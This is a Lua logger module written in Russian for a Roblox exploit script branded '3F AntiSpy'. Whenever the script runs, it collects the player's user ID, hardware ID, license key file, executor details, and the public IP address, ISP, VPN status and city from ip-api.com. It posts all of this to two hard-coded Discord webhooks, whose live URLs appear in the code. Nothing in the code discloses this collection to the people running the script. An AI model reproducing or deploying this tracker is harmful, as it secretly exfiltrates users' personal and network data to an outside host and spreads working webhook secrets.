-- =============================================================
-- ЛОГГЕР (ОТКРЫТАЯ ВЕРСИЯ, БЕЗ ШИФРОВКИ)
-- ЗАМЕНИ ВЕБХУКИ НА СВОИ ЕСЛИ НУЖНО
-- =============================================================
return function(SEC_STATE)
    if not SEC_STATE or not SEC_STATE.ORIG then return end
    local O = SEC_STATE.ORIG
    local LocalPlayer = SEC_STATE.LocalPlayer
    local HttpService = SEC_STATE.HttpService
    local RbxAnalytics = SEC_STATE.RbxAnalytics
    local UserInputService = SEC_STATE.UserInputService
    local request = O.request
    local game_HttpGet = O.game_HttpGet
    local pcall = O.pcall
    local pairs = O.pairs
    local ipairs = O.ipairs
    local tinsert = O.tinsert
    local tconcat = O.tconcat
    local tostring = O.tostring
    local m_floor = O.math_floor
    local task_wait = O.task_wait
    local task_spawn = O.task_spawn

    -- --------------------------
    -- ВЕБХУКИ (ОТКРЫТЫЙ ТЕКСТ)
    -- --------------------------
    local WEBHOOK_LOG   = "https://discord.com/api/webhooks/15194099151558385938/sw3cuWpE-S2SVYHM0r1MSEvv8XiLcE_ePdR-RwqxWfQ94cHPccRsd02RwcVYsG77Aga"
    local WEBHOOK_ALERT = "https://discord.com/api/webhooks/15183340335888381827/s1d18Avu2EmWpzTrT0jNIhjT6e1J57YX70OXHMVxxcyuSSw6L6nrBAjwVspga-L7SNKO"

    -- Если хочешь использовать свои вебхуки — вставляй их сюда вместо выше:
    -- local WEBHOOK_LOG = "ТВОЙ_ВЕБХУК_ОБЫЧНЫХ_ЛОГОВ"
    -- local WEBHOOK_ALERT = "ТВОЙ_ВЕБХУК_АЛЕРТОВ_О_СПАЯХ"

    local uid = tostring(LocalPlayer.UserId)
    local hwid = "N/A"
    pcall(function() hwid = RbxAnalytics:GetClientId() end)
    local key = "N/A"
    pcall(function() key = O.readfile("nazarkus_key.json") end)

    -- --------------------------
    -- ВАЙТЛИСТ / БЛЭКЛИСТ
    -- --------------------------
    local WHITELIST = {
        UIDs = {"10760143653"},
        HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
        Keys = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F", "89D11F50-5490-4677-B709-4EBFBECA78CE"}
    }
    local BLACKLIST = { UIDs = {}, HWIDs = {}, Keys = {} }

    local function inList(list)
        for _, v in ipairs(list.UIDs or {}) do if v == uid then return true end end
        for _, v in ipairs(list.HWIDs or {}) do if v == hwid then return true end end
        for _, v in ipairs(list.Keys or {}) do if v == key then return true end end
        return false
    end
    local userStatus = inList(WHITELIST) and "whitelist" or (inList(BLACKLIST) and "blacklist" or "guest")
    local spyDetected = SEC_STATE.detected or false
    local spyReason = SEC_STATE.reason or "None"
    SEC_STATE.status = userStatus
    SEC_STATE.hwid = hwid
    SEC_STATE.key = key

    -- --------------------------
    -- ИНФОРМАЦИЯ ОБ ЭКЗЕКЬЮТОРЕ
    -- --------------------------
    local executorName = "Unknown"
    local uncPercent = 0
    pcall(function()
        local supported = 0
        local genv = getgenv and getgenv() or _G
        local uncFuncs = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
        for _, funcName in ipairs(uncFuncs) do
            if genv[funcName] then supported = supported + 1 end
        end
        uncPercent = m_floor((supported / #uncFuncs) * 100)
        if identifyexecutor then
            pcall(function() executorName = identifyexecutor() end)
        end
    end)
    local executorString = executorName .. " (UNC: " .. uncPercent .. "%)"

    -- --------------------------
    -- СЕТЕВАЯ ИНФОРМАЦИЯ
    -- --------------------------
    local net = {ip="N/A", isp="N/A", vpn="No", country="N/A", city="N/A"}
    pcall(function()
        local r = request({
            Url = "http://ip-api.com/json/?fields=status,country,city,isp,query,proxy,hosting",
            Method = "GET"
        })
        if r and r.Success and r.Body then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, r.Body)
            if ok and data then
                net.ip = data.query or "N/A"
                net.isp = data.isp or "N/A"
                net.vpn = data.proxy and "Yes" or "No"
                net.country = data.country or "N/A"
                net.city = data.city or "N/A"
            end
        end
    end)

    -- --------------------------
    -- ФОРМИРУЕМ EMBED
    -- --------------------------
    local embeds = {}

    -- АЛЕРТ О СПАЕ (красный)
    if spyDetected then
        tinsert(embeds, {
            title = "🚨 SECURITY ALERT: HTTP Spy Detected",
            color = 16711680, -- красный
            fields = {
                {name = "Detection Reason", value = "```" .. tostring(spyReason) .. "```", inline = false},
                {name = "Player", value = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\nID: `" .. uid .. "`", inline = false},
                {name = "Executor", value = executorString, inline = true},
                {name = "System", value = UserInputService.TouchEnabled and "Mobile" or "PC", inline = true},
                {name = "Hardware Info", value = "HWID: `" .. hwid .. "`\nKey: `" .. key .. "`", inline = false},
                {name = "Network", value = "IP: " .. net.ip .. "\nISP: " .. net.isp .. "\nVPN: " .. net.vpn .. "\nLoc: " .. net.country .. ", " .. net.city, inline = false},
                {name = "Links", value = "[Profile](https://www.roblox.com/users/" .. uid .. "/profile)", inline = false}
            },
            footer = {text = "3F AntiSpy • DETECTED • " .. os.date("%d.%m.%Y %H:%M")}
        })
        -- Отправляем на алерт вебхук
        pcall(function()
            request({
                Url = WEBHOOK_ALERT,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({embeds = embeds})
            })
        end)
        return
    end

    -- ВАЙТЛИСТ (зелёный, короткий лог по твоему формату)
    if userStatus == "whitelist" then
        tinsert(embeds, {
            title = "✅ Whitelisted User Executed",
            color = 65280, -- зелёный
            fields = {
                {name = "**Player Info**", value = "Name: " .. LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\nUser ID: `" .. uid .. "`", inline = false},
                {name = "**Executor**", value = executorString, inline = false},
                {name = "**System**", value = "Platform: " .. (UserInputService.TouchEnabled and "Mobile" or "PC"), inline = false},
                {name = "**Hardware Info**", value = "HWID: `" .. hwid .. "`\nKey: `" .. key .. "`", inline = false}
            },
            footer = {text = "3F AntiSpy • WHITELIST • " .. os.date("%d.%m.%Y %H:%M")}
        })
    else
        -- БЛЭКЛИСТ (чёрный) ИЛИ ГОСТЬ (оранжевый)
        tinsert(embeds, {
            title = userStatus == "blacklist" and "⛔ Blacklisted User Attempt" or "⚠️ Guest User Executed",
            color = userStatus == "blacklist" and 0 or 16753920,
            fields = {
                {name = "Player Info", value = "Name: " .. LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\nID: `" .. uid .. "`\nAccount Age: " .. LocalPlayer.AccountAge .. " days", inline = false},
                {name = "Executor", value = executorString, inline = true},
                {name = "System", value = UserInputService.TouchEnabled and "Mobile" or "PC", inline = true},
                {name = "Hardware Info", value = "HWID: `" .. hwid .. "`\nKey: `" .. key .. "`", inline = false},
                {name = "Network", value = "IP: " .. net.ip .. "\nISP: " .. net.isp .. "\nVPN: " .. net.vpn .. "\nLoc: " .. net.country .. ", " .. net.city, inline = false},
                {name = "Links", value = "[Profile](https://www.roblox.com/users/" .. uid .. "/profile)", inline = false}
            },
            footer = {text = "3F AntiSpy • " .. string.upper(userStatus) .. " • " .. os.date("%d.%m.%Y %H:%M")}
        })
    end

    -- Отправляем обычный лог
    pcall(function()
        request({
            Url = WEBHOOK_LOG,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({embeds = embeds})
        })
    end)
end
